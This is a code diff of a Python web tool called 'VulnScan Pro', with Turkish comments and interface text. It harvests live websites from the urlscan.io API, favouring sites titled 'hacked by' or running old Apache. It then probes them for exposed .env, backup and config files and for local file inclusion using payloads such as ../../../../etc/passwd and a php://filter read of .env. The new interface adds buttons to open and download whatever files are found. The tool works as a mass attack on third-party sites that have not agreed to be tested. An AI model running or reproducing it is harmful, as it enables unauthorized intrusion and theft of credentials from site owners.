@@ -7,7 +7,6 @@ import sqlite3
 import urllib.parse
 import os
 import logging
-import time
 from typing import List
 import uvicorn
 
@@ -15,7 +14,7 @@ import uvicorn
 logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
 logger = logging.getLogger("VulnScan")
 
-app = FastAPI(title="VulnScan Pro - Advanced Engine")
+app = FastAPI(title="VulnScan Pro - Manual Access")
 
 # --- VERİTABANI VE DİZİN AYARLARI ---
 DATA_DIR = os.environ.get("DATA_DIR", "/var/data")
@@ -89,10 +88,7 @@ HEADERS = {
 }
 
 COMMON_DIRS = ["/admin", "/.env", "/backup.zip", "/config.php", "/phpinfo.php"]
-SQLI_PAYLOADS = ["'", "' OR 1=1 --"]
-SQL_ERRORS = ["you have an error in your sql syntax", "unclosed quotation mark"]
-LFI_PAYLOADS = ["../../../../etc/passwd"]
-XSS_PAYLOADS = ["<script>alert(1)</script>", "\"><svg/onload=alert(1)>"]
+LFI_PAYLOADS = ["../../../../etc/passwd", "php://filter/convert.base64-encode/resource=.env"]
 
 # --- ASENKRON VERİTABANI KAYDI ---
 async def save_finding(url, vuln, payload, data):
@@ -104,37 +100,9 @@ async def save_finding(url, vuln, payload, data):
             conn.commit()
     await asyncio.to_thread(db_insert)
 
-# --- GERÇEK HEDEF BULMA (OSINT) ---
-async def fetch_osint_targets(session, limit):
-    logger.info("Gerçek web siteleri aranıyor (URLScan API)...")
-    targets = set()
-    try:
-        queries = ['page.title:"hacked by"', 'page.server:"Apache/2.2"', 'page.title:"index of"']
-        for q in queries:
-            if len(targets) >= limit: break
-            encoded_q = urllib.parse.quote(q)
-            url = f"https://urlscan.io/api/v1/search/?q={encoded_q}&size={limit}"
-            async with session.get(url, timeout=10) as res:
-                if res.status == 200:
-                    data = await res.json()
-                    for result in data.get('results', []):
-                        if len(targets) >= limit: break
-                        page_url = result.get('page', {}).get('url')
-                        if page_url and page_url.startswith("http"):
-                            targets.add(page_url)
-            await asyncio.sleep(1)
-    except Exception as e:
-        logger.error(f"OSINT Hatası: {e}")
-
-    # Rastgele IP üretimi kaldırıldı. API çökerse boş liste döner.
-    if len(targets) == 0:
-        logger.warning("API'den veri alınamadı. Hedef listesi boş.")
-            
-    return list(targets)
-
 # --- TARAMA MOTORU ---
 async def scan_and_exploit(session, target_url, config):
-    report = {"target": target_url, "vulns": [], "status": "OK", "waf": False}
+    report = {"target": target_url, "discovered": [], "status": "OK"}
     
     try:
         async with session.get(target_url, timeout=5, ssl=False, allow_redirects=True, headers=HEADERS) as response:
@@ -143,60 +111,42 @@ async def scan_and_exploit(session, target_url, config):
                 await manager.broadcast({"type": "scan_result", "data": report})
                 return
 
-            # Dizin Taraması
+            # Dizin Keşfi
             if config.get("dirs"):
                 for path in COMMON_DIRS:
                     test_url = f"{target_url.rstrip('/')}{path}"
                     try:
                         async with session.get(test_url, timeout=3, ssl=False, headers=HEADERS) as res:
                             if res.status == 200:
-                                report["vulns"].append({"type": "Dizin", "payload": path, "evidence": "HTTP 200 OK"})
+                                content_length = res.headers.get('Content-Length', 'Bilinmiyor')
+                                report["discovered"].append({
+                                    "path": path,
+                                    "url": test_url,
+                                    "status": res.status,
+                                    "size": content_length
+                                })
                     except: pass
 
-            # SQLi
-            if config.get("sqli"):
-                for payload in SQLI_PAYLOADS:
-                    test_url = f"{target_url.rstrip('/')}/?id={urllib.parse.quote(payload)}"
-                    try:
-                        async with session.get(test_url, timeout=5, ssl=False, headers=HEADERS) as res:
-                            text = (await res.text()).lower()
-                            for error in SQL_ERRORS:
-                                if error in text:
-                                    report["vulns"].append({"type": "SQLi", "payload": payload, "evidence": error})
-                                    await save_finding(target_url, "SQLi", payload, error)
-                                    break
-                    except: pass
-
-            # LFI
+            # LFI Keşfi
             if config.get("lfi"):
                 for payload in LFI_PAYLOADS:
                     test_url = f"{target_url.rstrip('/')}/?file={urllib.parse.quote(payload)}"
                     try:
                         async with session.get(test_url, timeout=5, ssl=False, headers=HEADERS) as res:
                             text = await res.text()
-                            if "root:x:0:0" in text:
-                                report["vulns"].append({"type": "LFI", "payload": payload, "evidence": "Sistem dosyası okundu"})
-                                await save_finding(target_url, "LFI", payload, "System File Read")
-                                break
-                    except: pass
-
-            # XSS
-            if config.get("xss"):
-                for payload in XSS_PAYLOADS:
-                    test_url = f"{target_url.rstrip('/')}/?q={urllib.parse.quote(payload)}"
-                    try:
-                        async with session.get(test_url, timeout=5, ssl=False, headers=HEADERS) as res:
-                            text = await res.text()
-                            if payload in text:
-                                report["vulns"].append({"type": "XSS", "payload": payload, "evidence": "Reflected XSS"})
-                                await save_finding(target_url, "XSS", payload, "Reflected")
-                                break
+                            if "root:x:0:0" in text or (payload.startswith("php://") and len(text) > 50):
+                                report["discovered"].append({
+                                    "path": f"LFI Payload: {payload}",
+                                    "url": test_url,
+                                    "status": res.status,
+                                    "size": f"{len(text)} bytes"
+                                })
                     except: pass
 
     except Exception:
         report["status"] = "ERROR"
         
-    if report["vulns"]:
+    if report["discovered"]:
         report["status"] = "SIZILDI"
         
     await manager.broadcast({"type": "scan_result", "data": report})
@@ -206,16 +156,30 @@ async def run_scan_pipeline(config: dict):
     limit = config.get("limit", 50)
     threads = config.get("threads", 50)
     
-    logger.info(f"Tarama Başlatıldı. Limit: {limit} | Threads: {threads}")
+    logger.info(f"Manuel İnceleme Taraması Başlatıldı. Limit: {limit}")
     
     connector = aiohttp.TCPConnector(limit=threads, limit_per_host=5, ssl=False)
     timeout = aiohttp.ClientTimeout(total=10)
     
     async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        targets = await fetch_osint_targets(session, limit)
-        
+        targets = set()
+        try:
+            queries = ['page.title:"hacked by"', 'page.server:"Apache/2.2"']
+            for q in queries:
+                if len(targets) >= limit: break
+                url = f"https://urlscan.io/api/v1/search/?q={urllib.parse.quote(q)}&size={limit}"
+                async with session.get(url, timeout=10) as res:
+                    if res.status == 200:
+                        data = await res.json()
+                        for result in data.get('results', []):
+                            page_url = result.get('page', {}).get('url')
+                            if page_url and page_url.startswith("http"):
+                                targets.add(page_url)
+        except Exception as e:
+            logger.error(f"OSINT Hatası: {e}")
+            
         if not targets:
-            logger.warning("Taranacak hedef bulunamadı. İşlem iptal edildi.")
+            logger.warning("Taranacak hedef bulunamadı.")
             return
             
         logger.info(f"Toplam {len(targets)} hedef bulundu. Tarama başlıyor...")
@@ -235,9 +199,7 @@ class ScanConfig(BaseModel):
     limit: int
     threads: int
     dirs: bool
-    sqli: bool
     lfi: bool
-    xss: bool
 
 @app.post("/api/scan")
 async def start_scan(config: ScanConfig, background_tasks: BackgroundTasks):
@@ -260,7 +222,7 @@ def read_root():
     <html lang="tr">
     <head>
         <meta charset="UTF-8">
-        <title>VulnScan Pro | Advanced OSINT</title>
+        <title>VulnScan Pro | Manual Access</title>
         <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
         <style>
             :root {
@@ -302,34 +264,48 @@ def read_root():
             .log-info { color: var(--accent); }
             .log-warning { color: var(--warning); }
             .log-critical { color: var(--danger); font-weight: bold; }
-            .table-panel { width: 65%; display: flex; flex-direction: column; background: var(--bg); }
-            .table-container { flex: 1; overflow-y: auto; padding: 15px; }
-            table { width: 100%; border-collapse: collapse; }
-            th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid var(--border); font-size: 0.9rem; }
-            th { background: var(--panel); color: #94a3b8; font-weight: 600; position: sticky; top: 0; z-index: 10; }
-            tr:hover { background: #1e2230; }
-            .badge { padding: 4px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: 600; }
-            .badge-vuln { background: rgba(239, 68, 68, 0.15); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.3); }
-            .badge-clean { background: rgba(16, 185, 129, 0.15); color: var(--success); border: 1px solid rgba(16, 185, 129, 0.3); }
-            .badge-err { background: rgba(245, 158, 11, 0.15); color: var(--warning); border: 1px solid rgba(245, 158, 11, 0.3); }
-            .badge-waf { background: rgba(139, 92, 246, 0.15); color: #a78bfa; border: 1px solid rgba(139, 92, 246, 0.3); margin-left: 5px; }
-            .vuln-detail { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: #fca5a5; display: block; margin-top: 4px; }
-            .vuln-detail span { color: #fff; }
+            
+            /* Card Layout */
+            .results-panel { width: 65%; display: flex; flex-direction: column; background: var(--bg); }
+            .results-list { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 15px; }
+            .site-card { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+            .site-card.sizildi { border-left: 4px solid var(--danger); }
+            .site-card.temiz { border-left: 4px solid var(--success); }
+            .site-card.hata { border-left: 4px solid var(--warning); opacity: 0.7; }
+            
+            .site-header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; background: #1a1e29; }
+            .site-url { font-family: 'JetBrains Mono', monospace; font-size: 0.95rem; color: var(--text); word-break: break-all; }
+            .site-status { font-size: 0.75rem; padding: 4px 10px; border-radius: 4px; font-weight: 600; }
+            .status-sizildi { background: rgba(239, 68, 68, 0.2); color: var(--danger); border: 1px solid var(--danger); }
+            .status-temiz { background: rgba(16, 185, 129, 0.1); color: var(--success); }
+            .status-hata { background: rgba(245, 158, 11, 0.1); color: var(--warning); }
+            
+            /* Sub-paths */
+            .paths-list { padding: 10px 20px; list-style: none; display: flex; flex-direction: column; gap: 8px; }
+            .path-item { display: flex; justify-content: space-between; align-items: center; padding: 10px; background: var(--bg); border-radius: 4px; border: 1px solid var(--border); }
+            .path-info { font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; color: var(--text); }
+            .path-meta { font-size: 0.75rem; color: #64748b; margin-left: 10px; }
+            .path-actions { display: flex; gap: 8px; }
+            .btn-small { padding: 6px 12px; border-radius: 4px; font-size: 0.75rem; font-weight: 600; cursor: pointer; text-decoration: none; transition: 0.2s; color: #fff; }
+            .btn-open { background: var(--accent); }
+            .btn-open:hover { background: #4f46e5; }
+            .btn-download { background: var(--danger); }
+            .btn-download:hover { background: #dc2626; }
         </style>
     </head>
     <body>
         <div class="sidebar">
             <div class="brand">
                 <h1>VulnScan Pro</h1>
-                <p>ADVANCED ENGINE v2.0</p>
+                <p>MANUAL ACCESS ENGINE</p>
             </div>
             <div class="settings">
                 <div class="setting-group">
-                    <label>Hedef Limiti (Max 1000)</label>
-                    <input type="number" id="limit" value="100" min="10" max="1000">
+                    <label>Hedef Limiti</label>
+                    <input type="number" id="limit" value="50" min="10" max="1000">
                 </div>
                 <div class="setting-group">
-                    <label>Eşzamanlı İstek (Thread)</label>
+                    <label>Eşzamanlı İstek</label>
                     <input type="number" id="threads" value="50" min="10" max="200">
                 </div>
                 
@@ -337,9 +313,7 @@ def read_root():
                     <label>Tarama Modülleri</label>
                     <div class="checkbox-group">
                         <label><input type="checkbox" id="mod-dirs" checked> Dizin Keşfi</label>
-                        <label><input type="checkbox" id="mod-sqli" checked> SQL Injection</label>
-                        <label><input type="checkbox" id="mod-lfi" checked> LFI</label>
-                        <label><input type="checkbox" id="mod-xss" checked> XSS</label>
+                        <label><input type="checkbox" id="mod-lfi" checked> LFI Keşfi</label>
                     </div>
                 </div>
 
@@ -354,7 +328,7 @@ def read_root():
                     <span class="stat-value scanned" id="stat-scanned">0</span>
                 </div>
                 <div class="stat-item">
-                    <span class="stat-label">Sızılan</span>
+                    <span class="stat-label">Keşfedilen</span>
                     <span class="stat-value vuln" id="stat-vuln">0</span>
                 </div>
                 <div class="stat-item">
@@ -369,26 +343,13 @@ def read_root():
 
             <div class="content-layout">
                 <div class="terminal-panel">
-                    <div class="panel-header">Konsol Çıktısı</div>
+                    <div class="panel-header">Sistem Logları</div>
                     <div id="terminal" class="terminal"></div>
                 </div>
                 
-                <div class="table-panel">
-                    <div class="panel-header">Tarama Sonuçları</div>
-                    <div class="table-container">
-                        <table id="resultsTable">
-                            <thead>
-                                <tr>
-                                    <th>Hedef URL</th>
-                                    <th>Durum</th>
-                                    <th>Detaylar</th>
-                                </tr>
-                            </thead>
-                            <tbody id="tableBody">
-                                <!-- Sonuçlar buraya gelecek -->
-                            </tbody>
-                        </table>
-                    </div>
+                <div class="results-panel">
+                    <div class="panel-header">Tarama Sonuçları ve Alt Kademeler</div>
+                    <div id="results-list" class="results-list"></div>
                 </div>
             </div>
         </div>
@@ -397,7 +358,7 @@ def read_root():
             const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
             const ws = new WebSocket(protocol + window.location.host + "/ws");
             const terminal = document.getElementById('terminal');
-            const tableBody = document.getElementById('tableBody');
+            const resultsList = document.getElementById('results-list');
             
             let stats = { scanned: 0, vuln: 0, clean: 0, error: 0 };
 
@@ -419,27 +380,25 @@ def read_root():
                     stats.scanned++;
                     
                     const res = data.data;
-                    let statusBadge = "";
-                    let detailHtml = "";
+                    let cardClass = "site-card";
+                    let statusClass = "";
+                    let statusText = "";
                     
                     if (res.status === "SIZILDI") {
                         stats.vuln++;
-                        statusBadge = `<span class="badge badge-vuln">SIZILDI</span>`;
-                        res.vulns.forEach(v => {
-                            detailHtml += `<span class="vuln-detail">> <span>${v.type}</span>: ${v.payload || v.detail} (${v.evidence})</span>`;
-                        });
+                        cardClass += " sizildi";
+                        statusClass = "status-sizildi";
+                        statusText = "AÇIK BULUNDU";
                     } else if (res.status === "ERROR" || res.status.startsWith("HTTP")) {
                         stats.error++;
-                        statusBadge = `<span class="badge badge-err">${res.status}</span>`;
-                        detailHtml = `<span style="color:#64748b; font-size:0.8rem;">Erişilemedi veya yanıt vermedi.</span>`;
+                        cardClass += " hata";
+                        statusClass = "status-hata";
+                        statusText = res.status;
                     } else {
                         stats.clean++;
-                        statusBadge = `<span class="badge badge-clean">TEMİZ</span>`;
-                        detailHtml = `<span style="color:#64748b; font-size:0.8rem;">Zafiyet bulunamadı.</span>`;
-                    }
-
-                    if (res.waf) {
-                        statusBadge += `<span class="badge badge-waf">WAF VAR</span>`;
+                        cardClass += " temiz";
+                        statusClass = "status-temiz";
+                        statusText = "TEMİZ";
                     }
 
                     document.getElementById('stat-scanned').innerText = stats.scanned;
@@ -447,14 +406,38 @@ def read_root():
                     document.getElementById('stat-clean').innerText = stats.clean;
                     document.getElementById('stat-error').innerText = stats.error;
 
-                    const tr = document.createElement("tr");
-                    tr.innerHTML = `
-                        <td style="font-family:'JetBrains Mono', monospace; word-break:break-all;">${res.target}</td>
-                        <td>${statusBadge}</td>
-                        <td>${detailHtml}</td>
+                    const card = document.createElement("div");
+                    card.className = cardClass;
+                    
+                    let pathsHtml = "";
+                    if (res.discovered && res.discovered.length > 0) {
+                        pathsHtml = `<ul class="paths-list">`;
+                        res.discovered.forEach(p => {
+                            pathsHtml += `
+                                <li class="path-item">
+                                    <div>
+                                        <span class="path-info">${p.path}</span>
+                                        <span class="path-meta">(${p.size} | HTTP ${p.status})</span>
+                                    </div>
+                                    <div class="path-actions">
+                                        <a href="${p.url}" target="_blank" class="btn-small btn-open">Aç</a>
+                                        <a href="${p.url}" download class="btn-small btn-download">İndir</a>
+                                    </div>
+                                </li>
+                            `;
+                        });
+                        pathsHtml += `</ul>`;
+                    }
+
+                    card.innerHTML = `
+                        <div class="site-header">
+                            <div class="site-url">${res.target}</div>
+                            <div class="site-status ${statusClass}">${statusText}</div>
+                        </div>
+                        ${pathsHtml}
                     `;
                     
-                    tableBody.insertBefore(tr, tableBody.firstChild);
+                    resultsList.insertBefore(card, resultsList.firstChild);
                 }
             };
 
@@ -464,7 +447,7 @@ def read_root():
                 btn.innerText = "TARANIYOR...";
                 
                 terminal.innerHTML = "";
-                tableBody.innerHTML = "";
+                resultsList.innerHTML = "";
                 stats = { scanned: 0, vuln: 0, clean: 0, error: 0 };
                 document.getElementById('stat-scanned').innerText = 0;
                 document.getElementById('stat-vuln').innerText = 0;
@@ -475,9 +458,7 @@ def read_root():
                     limit: parseInt(document.getElementById('limit').value),
                     threads: parseInt(document.getElementById('threads').value),
                     dirs: document.getElementById('mod-dirs').checked,
-                    sqli: document.getElementById('mod-sqli').checked,
-                    lfi: document.getElementById('mod-lfi').checked,
-                    xss: document.getElementById('mod-xss').checked
+                    lfi: document.getElementById('mod-lfi').checked
                 };
 
                 try {
